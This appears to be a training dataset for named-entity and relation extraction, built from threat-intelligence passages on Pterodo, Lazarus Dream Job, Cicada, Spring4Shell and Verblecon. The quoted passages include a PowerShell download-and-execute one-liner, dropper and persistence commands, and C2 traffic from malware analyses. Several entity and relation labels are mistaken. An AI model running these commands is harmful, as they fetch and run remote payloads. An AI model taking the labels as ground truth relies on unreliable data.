{"instruction": "Backdoor.Pterodo.C \nThis variant is also designed to drop VBScripts on the infected computer. When run, it will first engage in API hammering, making multiple meaningless API calls, which is presumably an attempt to avoid sandbox detection. It will then unpack a script and a file called offspring.gif\u00a0to C:\\Users\\[username]\\. It will call the script with: \n\"wscript \"[USERNAME]\\lubszfpsqcrblebyb.tbi\" //e:VBScript /w /ylq /ib /bxk\u00a0 //b /pgs\" \nThis script runs\u00a0ipconfig /flushdns and executes the offspring.gif\u00a0file. Offsprint.gif\u00a0will download a PowerShell script from a random subdomain of\u00a0corolain.ru\u00a0and execute it: \ncvjABuNZjtPirKYVchnpGVop = \"$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp\"", "input": null, "output": "Named Entities: (Backdoor.Pterodo.C, malware), (VBScripts, tool), (offspring.gif, file), (corolain.ru, Domain)\nRelationships: (Backdoor.Pterodo.C, drop, VBScripts), (VBScripts, unpack, offspring.gif), (offspring.gif, download, corolain.ru)"}
{"instruction": "Backdoor.Pterodo.D \nThis variant is another VBScript dropper. It will create two files: \n[USERPROFILE]\\atwuzxsjiobk.ql \n[USERPROFILE]\\abide.wav \nIt executes them with the following command: \nwscript \"[USERPROFILE]\\atwuzxsjiobk.ql\" //e:VBScript /tfj /vy /g /cjr /rxia\u00a0 //b /pyvc \nSimilar to the other variants, the first script will run ipconfig /flushdns before calling the second script and removing the original executable. \nThe second script has two layers of obfuscation, but in the end it downloads the final payload from the domain declined.delivered.maizuko[.]ru and executes it.", "input": null, "output": "Named Entities: (Backdoor.Pterodo.D, malware), ([USERPROFILE]\\atwuzxsjiobk.ql, file), ([USERPROFILE]\\abide.wav, file), (declined.delivered.maizuko[.]ru, Domain)\nRelationships: (Backdoor.Pterodo.D, create, [USERPROFILE]\\atwuzxsjiobk.ql), (Backdoor.Pterodo.D, create, [USERPROFILE]\\abide.wav), (Backdoor.Pterodo.D, download, declined.delivered.maizuko[.]ru)"}
{"instruction": "Backdoor.Pterodo.E \nThe final variant is functionally very similar to variants B and C, engaging in API hammering before extracting two VBScript files to the user\u2019s home directory. Script obfuscation is very similar to other variants.", "input": null, "output": "Named Entities: (Backdoor.Pterodo.E, malware), (VBScript files, file)\nRelationships: (Backdoor.Pterodo.E, extract, VBScript files)"}
{"instruction": "Other tools \nWhile the attackers have made heavy use of Pterodo during recent weeks, other tools have also been deployed alongside it. These include UltraVNC, an open-source remote-administration/remote-desktop-software utility. UltraVNC has previously been used by Shuckworm in multiple attacks. \nIn addition to this, Shuckworm has also been observed using Process Explorer, a Microsoft Sysinternals tool designed to provide information about which handles and DLL processes have opened or loaded.", "input": null, "output": "Named Entities: (Pterodo, tool), (UltraVNC, tool), (Shuckworm, attacker), (Process Explorer, tool)\nRelationships: (Shuckworm, use, UltraVNC), (Shuckworm, use, Process Explorer)"}
{"instruction": "Persistent threat \nWhile Shuckworm is not the most tactically sophisticated espionage group, it compensates for this in its focus and persistence in relentlessly targeting Ukrainian organizations. It appears that Pterodo is being continuously redeveloped by the attackers in a bid to stay ahead of detection. \nWhile Shuckworm appears to be largely focused on intelligence gathering, its attacks could also potentially be a precursor to more serious intrusions, if the access it acquires to Ukrainian organizations is turned over to other Russian-sponsored actors.", "input": null, "output": "Named Entities: (Shuckworm, attacker), (Pterodo, malware)\nRelationships: (Shuckworm, redevelop, Pterodo)"}
{"instruction": "Lazarus Targets Chemical Sector", "input": null, "output": "No related entities and relations."}
{"instruction": "Continuation of Operation Dream Job sees North Korea-linked APT target orgs in espionage campaign. \nSymantec, a division of Broadcom Software , has observed the North Korea-linked advanced persistent threat (APT) group known as Lazarus conducting an espionage campaign targeting organizations operating within the chemical sector. The campaign appears to be a continuation of Lazarus activity dubbed Operation Dream Job, which was first observed in August 2020. Symantec tracks this sub-set of Lazarus activity under the name Pompilus.", "input": null, "output": "Named Entities: (Operation Dream Job, attacker), (North Korea-linked APT, attacker), (Lazarus, attacker)\nRelationships: (Operation Dream Job, continuation of, Pompilus), (Lazarus, conduct, Operation Dream Job)"}
{"instruction": "Operation Dream Job \nOperation Dream Job involves Lazarus using fake job offers as a means of luring victims into clicking on malicious links or opening malicious attachments that eventually lead to the installation of malware used for espionage. \nPast Dream Job campaigns have targeted individuals in the defense, government, and engineering sectors in activity observed in August 2020 and July 2021 .", "input": null, "output": "Named Entities: (Operation Dream Job, threat type), (Lazarus, attacker), (espionage,threat type)\nRelationships: (Operation Dream Job, involves, Lazarus), (Lazarus, for, espionage)"}
{"instruction": "Recently targeted sectors In January 2022, Symantec detected attack activity on the networks of a number of organizations based in South Korea. The organizations were mainly in the chemical sector, with some being in the information technology (IT) sector. However, it is likely the IT targets were used as a means to gain access to chemical sector organizations. There is sufficient evidence to suggest that this recent activity is a continuation of Operation Dream Job. That evidence includes file hashes, file names, and tools that were observed in previous Dream Job campaigns. A typical attack begins when a malicious HTM file is received, likely as a malicious link in an email or downloaded from the web. The HTM file is copied to a DLL file called scskapplink.dll and injected into the legitimate system management software INISAFE Web EX Client.", "input": null, "output": "Named Entities: (Operation Dream Job, attack), (scskapplink.dll, file)\nRelationships: (Operation Dream Job,  begins, scskapplink.dll)"}
{"instruction": "The scskapplink.dll file is typically a signed Trojanized tool with malicious exports added. The attackers have been observed using the following signatures: DOCTER USA, INC and \"A\" MEDICAL OFFICE, PLLC Next, scskapplink.dll downloads and executes an additional payload from a command-and-control (C&C) server with the URL parameter key/values \"prd_fld=racket\". This step kicks off a chain of shellcode loaders that download and execute arbitrary commands from the attackers, as well as additional malware, which are usually executed from malicious exports added to Trojanized tools such as the Tukaani project LZMA Utils library (XZ Utils). The attackers move laterally on the network using Windows Management Instrumentation (WMI) and inject into MagicLine by DreamSecurity on other machines. In some instances, the attackers were spotted dumping credentials from the registry, installing a BAT file in a likely effort to gain persistence, and using a scheduled task configured to run as a specific user.", "input": null, "output": "Named Entities: (scskapplink.dll, file), (Trojanized tool, tool), (C&C server, tool), (XZ Utils, tool), (MagicLine, tool)\n\nRelationships: (scskapplink.dll, belong to, Trojanized tool), (payload, download from, C&C server), (attackers, inject, MagicLine)"}
{"instruction": "The attackers were also observed deploying post-compromise tools, including a tool used to take screenshots of web pages viewed on the compromised machine at set intervals (SiteShoter). They were also seen using an IP logging tool (IP Logger), a protocol used to turn computers on remotely (WakeOnLAN), a file and directory copier (FastCopy), and the File Transfer Protocol (FTP) executed under the MagicLine process.", "input": null, "output": "Named Entities: (SiteShoter, tool), (IP Logger, tool), (WakeOnLAN, tool), (FastCopy, tool)\nRelationships: (attackers, deploy, SiteShoter), (attackers, deploy, IP Logger), attackers, deploy, WakeOnLAN), (attackers, deploy, FastCopy)"}
{"instruction": "Case study The following is a case study detailing step-by-step attacker activity on an organization in the chemical sector. January 17, 2022 00:51 \u2013 A malicious HTM file is received: e31af5131a095fbc884c56068e19b0c98636d95f93c257a0c829ec3f3cc8e4ba - csidl_profile\\appdata\\local\\microsoft\\windows\\inetcache\\ie\\3tygrjkm\\join_06[1].htm The HTM file is copied to a DLL file: rundll32.exe CSIDL_PROFILE\\public\\scskapplink.dll,netsetcookie Cnusrmgr This DLL file is injected into the legitimate system management software INISAFE Web EX Client. The file is a signed Trojanized version of the ComparePlus plugin for Notepad++ with malicious exports added. 01:02 \u2013 The file is run and downloads and executes a backdoor payload (final.cpl - 5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db) from a command-and-control (C&C) server with the URL parameter key/values \"prd_fld=racket\". The file final.cpl is a Trojanized version of the Tukaani project LZMA Utils library (XZ Utils) with a malicious export added (AppMgmt). The malware connects to, downloads, decodes, and executes shellcode from the following remote location: hxxp[:]//happy[.]nanoace.co.kr/Content/rating/themes/krajee-fas/FrmAMEISMngWeb.asp", "input": null, "output": "Named Entities: (e31af5131a095fbc884c56068e19b0c98636d95f93c257a0c829ec3f3cc8e4ba, SHA256), (join_06[1].htm, file), (rundll32.exe, file), (final.cpl, file), (5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db, SHA256), (command-and-control server, tool), (hxxp[:]//happy[.]nanoace.co.kr/Content/rating/themes/krajee-fas/FrmAMEISMngWeb.asp, URL)\n\nRelationships: (join_06[1].htm, hash, e31af5131a095fbc884c56068e19b0c98636d95f93c257a0c829ec3f3cc8e4ba), (join_06[1].htm, copied to, rundll32.exe), (rundll32.exe, downloaded and executed, final.cpl), (final.cp, hash, 5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db), (malware, connect, hxxp[:]//happy[.]nanoace.co.kr/Content/rating/themes/krajee-fas/FrmAMEISMngWeb.asp)"}
{"instruction": "01:04 \u2013 Another CPL file (61e305d6325b1ffb6de329f1eb5b3a6bcafa26c856861a8200d717df0dec48c4) is executed. This file, again, is a Trojanized version of LZMA Utils with a malicious added export. 01:13 \u2013 The shellcode loader (final.cpl) is executed again several times. 01:38 \u2013 Commands are executed to dump credentials from the SAM and SYSTEM registry hives. Over the next several hours, the attackers run unknown shellcode via final.cpl at various intervals, likely to collect the dumped system hives, among other things. 06:41 \u2013 The attackers create a scheduled task to ensure persistence between system reboots: schtasks /create /RU [REDACTED].help\\175287 /ST 15:42 /TR \"cmd.exe /c C:\\ProgramData\\Intel\\Intel.bat\" /tn arm /sc MINUTE", "input": null, "output": "Named Entities: (61e305d6325b1ffb6de329f1eb5b3a6bcafa26c856861a8200d717df0dec48c4, SHA256), (final.cpl, file), (cmd.exe, file), (C:\\ProgramData\\Intel\\Intel.bat, file)\n\nRelationships: (final.cpl, hash, 61e305d6325b1ffb6de329f1eb5b3a6bcafa26c856861a8200d717df0dec48c4), (schtasks, create, scheduled task), (scheduled task, run, cmd.exe), (cmd.exe, execute, C:\\ProgramData\\Intel\\Intel.bat)"}
{"instruction": "The scheduled task instructs the system to execute 'Intel.bat' as user \u2018[REDACTED].help/175287\u2019 starting at 15:42 then every minute under the scheduled task name \u2018arm\u2019. It's unclear if this was an account that was cracked via the dumped registry hives or an account the attackers were able to create with admin rights. The attackers were also observed installing Cryptodome (PyCrypto fork) Python encryption modules via CPL files. A clean installation of BitDefender was also installed by the attackers. While unconfirmed, the threat actors may have installed an older version of this software (from 2020) with a vulnerability that allowed attackers to run arbitrary commands remotely . January 18 00:21 \u2013 The final.cpl file is executed again. 00:49 \u2013 A new CPL file called wpm.cpl (942489ce7dce87f7888322a0e56b5e3c3b0130e11f57b3879fbefc48351a78f6) is executed. CSIDL_COMMON_APPDATA\\finaldata\\wpm.cpl Thumbs.ini 4 30 This file contains, and connects to, a list of IP addresses and records whether the connections were successful.", "input": null, "output": "Named Entities: (Intel.bat, file), (Cryptodome, tool), (PyCrypto, tool), (BitDefender, tool), (final.cpl, file), (wpm.cpl, file), (942489ce7dce87f7888322a0e56b5e3c3b0130e11f57b3879fbefc48351a78f6, SHA256)\n\nRelationships: (attacker, execute, Intel.bat), (attackers, install, Cryptodome), (attackers, install, PyCrypto), (attackers, install, BitDefender), (attacker, execute, final.cpl), (attacker, execute, wpm.cpl), (wpm.cpl, hash, 942489ce7dce87f7888322a0e56b5e3c3b0130e11f57b3879fbefc48351a78f6)"}
{"instruction": "01:11 \u2013 Again, the final.cpl shellcode loader is executed multiple times, executing some unknown shellcode. This activity continued intermittently until 23:49. 23:49 \u2013 The file name of the CPL file changes to 'ntuser.dat'. The file location and command-line arguments remain the same. January 19 00:24 \u2013 The CPL shellcode loader files (final.cpl and ntuser.dat) are executed multiple times. 00:28 \u2013 The attackers create a scheduled task on another machine, likely to ensure persistence: schtasks /create /RU [REDACTED]\\i21076 /ST 09:28 /TR \"cmd.exe /c C:\\ProgramData\\Adobe\\arm.bat\" /tn arm /sc MINUTE The command is used to schedule a task named 'arm' to run the file 'arm.bat' starting at at 09:28 then every minute after that under the user account '[REDACTED]\\i21076'. 00:29 \u2013 A file named arm.dat (48f3ead8477f3ef16da6b74dadc89661a231c82b96f3574c6b7ceb9c03468291) is executed with the following command line arguments: CSIDL_SYSTEM\\rundll32.exe CSIDL_COMMON_APPDATA\\adobe\\arm.dat,packageautoupdater LimitedSpatialExtent_U_f48182 -d 1440 -i 10 -q 8 -s 5", "input": null, "output": "Named Entities: (final.cpl, file), (ntuser.dat, file), (scheduled task, tool), (arm.bat, file), (arm.dat, file), (48f3ead8477f3ef16da6b74dadc89661a231c82b96f3574c6b7ceb9c03468291, SHA256)\nRelationships: (final.cpl, changes to, ntuser.dat), (attacker, use, scheduled task), (scheduled task, run, arm.bat), (arm.bat, executed, arm.dat), (arm.dat, hash, 48f3ead8477f3ef16da6b74dadc89661a231c82b96f3574c6b7ceb9c03468291)"}
{"instruction": "The arm.dat file is a tool used to take screenshots of web pages viewed on the compromised machine every 10 seconds (SiteShoter), as determined by the command line arguments. The screenshots are saved in appdata\\local with the date at the top of the file. 06:50 \u2013 The shellcode loader (final.cpl) is executed several times. 07:34 \u2013 A new CPL file named addins.cpl (5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db) is executed multiple times, which again is another shellcode loader and has the same command line arguments as seen with final.cpl: CSIDL_SYSTEM\\rundll32.exe CSIDL_COMMON_APPDATA\\addins.cpl, AppMgmt EO6-CRY-LS2-TRK3 07:39 \u2013 A scheduled task is created: sc create uso start= auto binPath= \u201ccmd.exe /c start /b C:\\Programdata\\addins.bat\u201d DisplayName= uso The task is used to auto-start and execute addins.bat each time the system is booted. The task uses the service name 'uso' (a file name previously used in older Dream Job campaigns targeting security researchers).", "input": null, "output": "Named Entities: (arm.dat, tool), (final.cpl, file), (addins.cpl, file), (5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db, SHA256), (scheduled task, tool), (addins.bat, file), (Dream Job, attacker)\nRelationships: (addins.cpl, hash, 5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db), (scheduled task, created), (scheduled task, auto-start and execute, addins.bat)"}
{"instruction": "The attacker runs addins.cpl again to run a command to start the service and then delete the service directly after: CSIDL_SYSTEM\\rundll32.exe CSIDL_COMMON_APPDATA\\addins.cpl, AppMgmt EO6-CRY-LS2-TRK3 sc start uso (via cmd.exe) sc delete uso The following commands were then executed to collect information pertaining to network configuration, current user the attackers are logged in as, active users on the machine, available shared drives, and the contents of the 'addins' directory. ipconfig /all whoami query user net use dir CSIDL_WINDOWS\\addins 07:41 \u2013 The file addins.cpl is executed again multiple times before a scheduled task is created to run addins.bat again, start the service, and immediately delete the service: sc create uso start= auto binPath= \"cmd.exe /c start /b C:\\Windows\\addins\\addins.bat\" DisplayName= uso sc start uso sc delete uso January 20 The attackers execute addins.cpl again with the same command line as before. No further activity is observed.", "input": null, "output": "Named Entities: (addins.cpl, file), (CSIDL_SYSTEM\\rundll32.exe, file), (CSIDL_COMMON_APPDATA\\addins.cpl, file), (cmd.exe, file), (addins.bat, file)\nRelationships: (attacker, run, addins.cpl), (addins.cpl, delete, CSIDL_SYSTEM\\rundll32.exe), (addins.cpl, delete, CSIDL_COMMON_APPDATA\\addins.cpl)"}
{"instruction": "The Lazarus group is likely targeting organizations in the chemical sector to obtain intellectual property to further North Korea\u2019s own pursuits in this area. The group\u2019s continuation of Operation Dream Job, as witnessed by Symantec and others , suggests that the operation is sufficiently successful. As such, organizations should ensure they have adequate security in place and remain vigilant for attacks such as this. As always, users should be wary of clicking links or downloading files even if they come from seemingly trustworthy sources.", "input": null, "output": "Named Entities: (Lazarus, attacker), (Operation Dream Job, attack)\nRelationships: (Lazarus group, continuation of, Operation Dream Job)"}
{"instruction": "Cicada: Chinese APT Group Widens Targeting in Recent Espionage Activity", "input": null, "output": "Named Entities: (Cicada, attacker), (Espionage, threat type)\nRelationships: (Cicada, engage in, Espionage)"}
{"instruction": "Government orgs and NGOs among victims in a wide-ranging and sustained campaign. A Chinese state-backed advanced persistent threat (APT) group is attacking organizations around the globe in a likely espionage campaign that has been ongoing for several months. Victims in this Cicada (aka APT10) campaign include government, legal, religious, and non-governmental organizations (NGOs) in multiple countries around the world, including in Europe, Asia, and North America. The wide number of sectors and geographies of the organizations targeted in this campaign is interesting. Cicada\u2019s initial activity several years ago was heavily focused on Japanese-linked companies, though in more recent times it has been linked to attacks on managed service providers (MSPs) with a more global footprint. However, this campaign does appear to indicate a further widening of Cicada\u2019s targeting.", "input": null, "output": "Named Entities: (Cicada, attacker), (APT10, attacker)\nRelationships: (Cicada, aka, APT10)"}
{"instruction": "The attribution of this activity to Cicada is based on the presence on victim networks of a custom loader and custom malware that are believed to be exclusively used by the APT group. While Cicada has been linked to espionage-style operations dating back to 2009, the earliest activity in this current campaign occurred in mid-2021, with the most recent activity seen in February 2022, so this is a long-running attack campaign that may still be ongoing, researchers from Symantec, a division of Broadcom , have found.", "input": null, "output": "Named Entities: (Cicada, attacker), (custom loader, tool), (custom malware, malware)\nRelationships: (Cicada, use, custom loader), (Cicada, use, custom malware)"}
{"instruction": "Activity on infected networks In several cases, the initial activity on victim networks is seen on Microsoft Exchange Servers, suggesting the possibility that a known, unpatched vulnerability in Microsoft Exchange may have been used to gain access to victim networks in some cases. Once the attackers have successfully gained access to victim machines we observe them deploying various different tools, including a custom loader and the Sodamaster backdoor. The loader deployed in this campaign was also deployed in a previous Cicada attack.", "input": null, "output": "Named Entities: (Sodamaster backdoor, malware), (Cicada, attacker), (custom loader, tool)\nRelationships: (Cicada, deploy, custom loader), (Cicada, deploy, Sodamaster backdoor)"}
{"instruction": "Sodamaster is a known Cicada tool that is believed to be exclusively used by this group. It is a fileless malware that is capable of multiple functions, including evading detection in a sandbox by checking for a registry key or delaying execution; enumerating the username, hostname, and operating system of targeted systems; searching for running processes, and downloading and executing additional payloads. It is also capable of obfuscating and encrypting traffic that it sends back to its command-and-control (C&C) server. It is a powerful backdoor that Cicada has been using since at least 2020. In this campaign, the attackers are also seen dumping credentials, including by using a custom Mimikatz loader. This version of Mimikatz drops mimilib.dll to obtain credentials in plain text for any user that is accessing the compromised host and provides persistence across reboots.", "input": null, "output": "Named Entities: (Sodamaster, malware), (Cicada, attacker), (Mimikatz loader, tool), (mimilib.dll, file)\n\nRelationships: (Sodamaster, used by, Cicada), (Mimikatz loader, used by, Sodamaster), (mimilib.dll, dropped by, Mimikatz loader)"}
{"instruction": "The attackers also exploit the legitimate VLC Media Player by launching a custom loader via the VLC Exports function, and use the WinVNC tool for remote control of victim machines. Other tools utilized in this attack campaign include: RAR archiving tool - can be used to compress, encrypt, or archive files, likely for exfiltration. System/Network discovery - a way for attackers to determine what systems or services are connected to an infected machine. WMIExec - Microsoft command-line tool that can be used to execute commands on remote computers. NBTScan - an open-source tool that has been observed being used by APT groups to conduct internal reconnaissance within a compromised network.", "input": null, "output": "Named Entities: (WinVNC, tool), (RAR archiving tool, tool), (WMIExec, tool), (NBTScan, tool)\nRelationships: (attacker, use, WinVNC), (attacker, use, RAR archiving tool), (attacker, use, WMIExec), (attacker, use, NBTScan), "}
{"instruction": "Victims \nThe victims in this campaign appear to primarily be government-related institutions or NGOs, with some of these NGOs working in the fields of education and religion. There were also victims in the telecoms, legal, and pharmaceutical sectors. \nThe victims are spread through a wide number of regions including the U.S., Canada, Hong Kong, Turkey, Israel, India, Montenegro, and Italy. There is also just one victim in Japan, which is notable due to Cicada\u2019s previous strong focus on Japanese-linked companies. \nThe attackers spent as long as nine months on the networks of some victims. \nThe victims targeted, the various tools deployed in this campaign, and what we know of Cicada\u2019s past activity all indicate that the most likely goal of this campaign is espionage. Cicada activity was linked by U.S. government officials to the Chinese government in 2018.", "input": null, "output": "Named Entities: (Cicada, attacker), (espionage, threat type)\n\nRelationships: (Cicada, goal of, espionage)"}
{"instruction": "Significance of this activity \nThis is a long-running campaign from a sophisticated and experienced nation-state-backed actor that may still be ongoing, as the most recent activity we saw in this campaign was in February 2022. The targeting of multiple large organizations in different geographies at the same time would require a lot of resources and skills that are generally only seen in nation-state backed groups, and shows that Cicada still has a lot of firepower behind it when it comes to its cyber activities.", "input": null, "output": "Named Entities: (Cicada, attacker)\nRelationships: No related entities and relations."}
{"instruction": "Spring4Shell: New Zero-day RCE Vulnerability Uncovered in Java Framework", "input": null, "output": "No related entities and relations."}
{"instruction": "Symantec products will protect against attempted exploits of Spring4Shell vulnerability. \nUPDATE, April 1, 2022: Updated with additional protection information \nA zero-day vulnerability in the Spring Core Java framework that could allow for unauthenticated remote code execution (RCE) on vulnerable applications was publicly disclosed on March 30, before a patch was released. It was dubbed Spring4Shell.", "input": null, "output": "No related entities and relations."}
{"instruction": "Will Symantec products protect against exploit attempts? \nYes, Symantec products will guard against exploit attempts with the following detections: \nNetwork-based \nAudit: Spring Core Spring4Shell Activity \nWeb Attack: Spring Core Spring4Shell Activity 2 \nFile-based \nHacktool \nHacktool.Spring4shell \nPolicy-based \nData Center Security (DCS) Intrusion Prevention (with default policies) provides zero-day protection against exploitation of the Spring4Shell vulnerability.", "input": null, "output": "No related entities and relations."}
{"instruction": "Is a patch available for Spring4Shell? \nSpring has now released Spring Framework 5.3.18 and 5.2.20, which it says address the vulnerability. Spring Boot 2.6.6 and 2.5.12 that depend on Spring Framework 5.3.18 have also been released. Temporary remediation steps were also published by researchers at Praetorian prior to the updates being released. Spring also published suggested workarounds in its blog . \nA CVE report for the vulnerability was also published this afternoon and given the designation CVE-2022-22965 , and assessed as being \u201chigh severity.\u201d", "input": null, "output": "Named Entities: (CVE-2022-22965, vulnerability)\nRelationships: No related entities and relations.\n"}
{"instruction": "How serious is this vulnerability? There appears to have been confusion about the potential severity of Spring4Shell. While it was initially reported that all versions of Spring Core with the JDK version greater than or equal to 9.0 were vulnerable to it, researchers subsequently determined that it appears Spring Core must be configured in a certain way to be vulnerable. In its vulnerability report , Spring itself stated that for the \u201cspecific exploit\u201d to work, an application must meet the following prerequisites: JDK 9 or higher Apache Tomcat as the Servlet container Packaged as WAR spring-webmvc or spring-webflux dependency \u201cIf the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit,\u201d the advisory reads. However, it did also say that \u201cthe nature of the vulnerability is more general, and there may be other ways to exploit it.\u201d", "input": null, "output": "No related entities and relations."}
{"instruction": "Given these prerequisites, it\u2019s not clear how many instances of the Spring Core Java framework may be vulnerable to this bug.", "input": null, "output": "No related entities and relations."}
{"instruction": "Is Spring4Shell being actively exploited in the wild? \nProof-of-concept exploit code for Spring4Shell was leaked on GitHub shortly after it was discovered and before a patch was issued. The code was swiftly removed, but not before it was downloaded by several security researchers who confirmed the vulnerability. It was also reposted on various platforms, meaning it was available to the public, including malicious actors. It has been reported that Spring4Shell was being actively exploited in attacks.", "input": null, "output": "No related entities and relations."}
{"instruction": "What is Spring4Shell? \nSpring4Shell is a bug in Spring Core, a popular application framework that allows software developers to quickly and easily develop Java applications with enterprise-level features. These applications can then be deployed on servers, such as Apache Tomcat, as stand-alone packages with all the required dependencies. \nThe bug allows an unauthenticated attacker to execute arbitrary code on a vulnerable system. \nIn a blog published on Thursday (March 31), Spring revealed that the Spring4Shell bug was reported to VMware (which owns Spring) by researchers from AntGroup FG on Tuesday, with the team intending to release emergency patches for the bug on Thursday, but details of the bug were leaked online on Wednesday.", "input": null, "output": "No related entities and relations."}
{"instruction": "Is Spring4Shell related to CVE-2022-22963? \nNo, CVE-2022-22963 is a different bug in the Spring Cloud Function, which is a separate Java library from Spring Core. An advisory for this bug was published on March 29 and patches are available for it.", "input": null, "output": "Named Entities: (CVE-2022-22963, vulnerability)\nRelationships: No related entities and relations."}
{"instruction": "Is this new bug as serious as Log4Shell? \nWhile the naming of the vulnerability appears to have been inspired by the Log4Shell vulnerability that was discovered in December 2021 , it is not clear if the impact of this bug will be as significant. \nWe will update this blog with any new relevant information as we get it.", "input": null, "output": "No related entities and relations."}
{"instruction": "Verblecon: Sophisticated New Loader Used in Low-level Attacks", "input": null, "output": "Named Entities: (Verblecon, malware)\nRelationships: No related entities and relations."}
{"instruction": "Indications the attacker may not realize the potential capabilities of the malware they are using. \nAn unknown attacker is using a complex and powerful new malware loader in relatively unsophisticated and low-reward attacks, indicating they may not realize the potential capabilities of the malware they are deploying. \nThe malware, Trojan.Verblecon, is being used in attacks that appear to have installing cryptocurrency miners on infected machines as their end goal. There are some indications the attacker may also be interested in stealing access tokens for chat app Discord. However, the capabilities of this malware indicate that it could be highly dangerous if leveraged in ransomware or espionage campaigns. \nVerblecon was first spotted by analysts from Symantec, a division of Broadcom Software , in January 2022. This blog will detail the capabilities of the malware.", "input": null, "output": "Named Entities: (Trojan.Verblecon, malware), (cryptocurrency miners, threat type), (ransomware, threat type), (espionage, threat type)\nRelationships: (Trojan.Verblecon, goal, cryptocurrency miners)"}
{"instruction": "Technical breakdown The malware is loaded as a server-side polymorphic JAR file. The fact that the file is polymorphic means that, due to encryption and obfuscation, the code of the malware payload looks different each time it is downloaded. Attackers generally pack malware in this way in an effort to evade detection by security software. The malware samples analyzed by Symantec were fully obfuscated, in the code flow, strings, and symbols. The samples themselves may be based on publicly available code . Once started, the malware checks its command-line arguments. It requires at least one command-line argument to execute, which could be the infection or campaign ID initially e.g. \"CSIDL_SYSTEM_DRIVE\\program files\\java\\jre1.8.0_301\\bin\\javaw.exe\" -jar \"CSIDL_PROFILE\\appdata\\local\\temp\\rpvbh.jar\" masonkhonsari and \"CSIDL_SYSTEM_DRIVE\\program files\\java\\jre1.8.0_301\\bin\\javaw.exe\" -jar \"CSIDL_PROFILE\\appdata\\local\\temp\\rpvbh.jar\" 923ec15ffa4474ca7bf200bfb90e782d Additionally, it also attempts to determine if its own process is being debugged by checking for the following Java command-line arguments: \"-xbootclasspath\" \"-xdebug\" \"-agentlib\" \"-javaagent:\" \"-xrun:\" \"-verbose\" \"-agentpath:\"", "input": null, "output": "Named Entities: (javaw.exe, file), (rpvbh.jar, file)\nRelationships: No related entities and relations."}
{"instruction": "\"ct\" has value \"0\" \"bv\" has value \"v1.0.0\" The server has been observed to respond as follows: HTTP/1.1 200 OK Date: Fri, 28 Jan 2022 21:29:26 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive CF-Cache-Status: DYNAMIC Expect-CT: max-age=604800, report-uri=\"hxxps://report-uri[.]cloudflare.com/cdn-cgi/beacon/expect-ct\" Report-To: {\"endpoints\":[{\"url\":\"hxxps:\\/\\/a.nel.cloudflare[.]com\\/report\\/v3?s=JE2u6s575flQq%2BEumTamotRln2IsYdLgqtQHy0tGJwQp9tuxhWThqxtCzsMG6vVgc%2Fa76jGYsP8hb68S3hKu8Q5lm6H2iIYElyVHw4WOcGSLqi%2FLR6AX5RcYlsXd\"}],\"group\":\"cf-nel\",\"max_age\":604800} NEL: {\"success_fraction\":0,\"report_to\":\"cf-nel\",\"max_age\":604800} Server: cloudflare CF-RAY: 6d4d50f69c993a8d-CDG alt-svc: h3=\":443\"; ma=86400, h3-29=\":443\"; ma=86400 98 Rc0OiT8tzq68CmJ7bi0SMLtCQQH8bjxlid0OONwvn+x9g2ku8Ocfx+lT+TZXBzLC9/K7hJ/efOYWz9e1HC3KrRkQoh3OTZezXIOhJ6gTRPiLeqDgCGT79FcFqm7SFEDPHl1NpR14dl/6R92VwKZE/A== 0 Where the response body can be decrypted as follows: newtask:1:Mw==:YUhSMGNITTZMeTlxYjI1aGRHaGhibWhoY21SM2FXTnJMbTFsTDJoaGNtUjNhV05yTG1waGNuNXpkR0Z5ZEE9PQ== The last term above contains the following string: hxxps://jonathanhardwick[.]me/hardwick.jar~start Some samples of the malware are seen communicating with the following servers: gaymers[.]ax 6f3af6ffb074513b51bba688a0b41df7[.]tk Communication between the malware and servers is over HTTP or HTTPS and this communication appears to culminate with victims being directed to connect to the following: POST /mafia/login.php HTTP/1.1 User-Agent: VerbleConnectTM Content-Type: application/x-www-form-urlencoded charset: utf-8 Cache-Control: no-cache Pragma: no-cache Host: gaymers.ax Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 291 id=il~aSS_3ZNaXHMGXLExSyzp6xMrxMB7zCw1zFndLA87jjqd0tPsFqY31LF65YGEt&os=5i1E5v8J8fUqwpvNWkN6QQ&pv=6qWqTXHlWudJmSz_fuWcBA&ip=VfseCVZvINz5rCbXun59p", "input": null, "output": "Named Entities: (gaymers[.]ax, Domain), (6f3af6ffb074513b51bba688a0b41df7[.]tk, Domain), (hxxps://jonathanhardwick[.]me/hardwick.jar~start, URL)\nRelationships: No related entities and relations."}
{"instruction": "The payload is downloaded from the URL observed earlier: hxxps://jonathanhardwick[.]me/hardwick.jar The payload is obfuscated in a similar way to the other samples, and also contains similar techniques to detect the virtualization environment, as well as other functionality. The core functionality is to download and execute a binary blob from the following URL: hxxps://jonathanhardwick[.]me/hardwick.bin The blob is decrypted along with *.bin artifacts from the same host. The downloaded blob is then cached on the local filesystem (in re-encrypted form) and injected into %Windows%\\SysWow64\\dllhost.exe for execution. The injection is performed using com.sun.jna and doesn't use usual APIs for injection. The final payload (hardwick.bin) contains the following embedded URL pointing to a configuration file for a cryptocurrency miner: hxxps://jonathanhardwick[.]me/config[.]txt This indicates that the purpose of this activity was to install cryptocurrency mining software on victim machines.", "input": null, "output": "Named Entities: (hxxps://jonathanhardwick[.]me/hardwick.jar, URL), (hxxps://jonathanhardwick[.]me/hardwick.bin, URL), (hxxps://jonathanhardwick[.]me/config[.]txt, URL), (jonathanhardwick[.]me, Domain), (%Windows%\\SysWow64\\dllhost.exe, file), (hardwick.bin, file), (hxxps://jonathanhardwick[.]me/config[.]txt, URL), (cryptocurrency miner, threat type)\nRelationships:  No related entities and relations."}
